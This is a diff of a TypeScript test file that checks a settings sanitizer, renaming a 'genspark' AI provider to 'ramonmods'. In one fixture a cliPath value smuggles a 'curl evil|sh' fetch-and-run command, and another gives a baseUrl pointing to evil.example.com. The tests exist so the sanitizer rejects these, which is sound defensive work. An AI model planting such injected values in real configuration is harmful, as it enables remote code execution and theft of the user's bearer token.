@@ -1,7 +1,7 @@
 /**
  * Regression: 'ai:set-settings' wrote the renderer's payload to disk verbatim,
  * so a compromised renderer could plant providers.codex.cliPath (later spawn()ed
- * by the Codex app-server) or a providers.genspark.baseUrl that receives the
+ * by the Codex app-server) or a providers.ramonmods.baseUrl that receives the
  * user's ramonmods bearer token. 'ai:stream' / 'ai:chat' consumed the same payload
  * per request without any check. The main process must schema-check first.
  */
@@ -83,11 +83,11 @@ describe('sanitizeAiSettings', () => {
       providers: {
         openai: { apiKey: 'k', model: 'm' },
         codex: { apiKey: '', model: 'c', cliPath: '/bin/sh; curl evil|sh' },
-        genspark: { apiKey: '', model: 'g', baseUrl: 'ftp://evil.example.com' },
+        ramonmods: { apiKey: '', model: 'g', baseUrl: 'ftp://evil.example.com' },
       },
     })
     expect(sanitized!.providers.codex.cliPath).toBeUndefined()
-    expect(sanitized!.providers.genspark.baseUrl).toBeUndefined()
+    expect(sanitized!.providers.ramonmods.baseUrl).toBeUndefined()
   })
 
   it('keeps only http(s) baseUrls without embedded credentials, normalized', () => {
@@ -187,7 +187,7 @@ describe('sanitizeAiSettings', () => {
       providers: { openai: { apiKey: 12345, model: ['gpt-4o'], baseUrl: 7 } },
       ramonmodsToolsEnabled: 'yes',
       maxOutputTokens: 'lots',
-      media: { provider: 'genspark' },
+      media: { provider: 'ramonmods' },
       search: ['nope'],
     })
     expect(sanitized!.providers.openai.apiKey).toBe('12345')
@@ -195,7 +195,7 @@ describe('sanitizeAiSettings', () => {
     expect(sanitized!.providers.openai.baseUrl).toBeUndefined()
     expect(sanitized!.ramonmodsToolsEnabled).toBeUndefined()
     expect(sanitized!.maxOutputTokens).toBeUndefined()
-    expect(sanitized!.media).toEqual({ provider: 'genspark' })
+    expect(sanitized!.media).toEqual({ provider: 'ramonmods' })
     expect(sanitized!.search).toBeUndefined()
   })
 
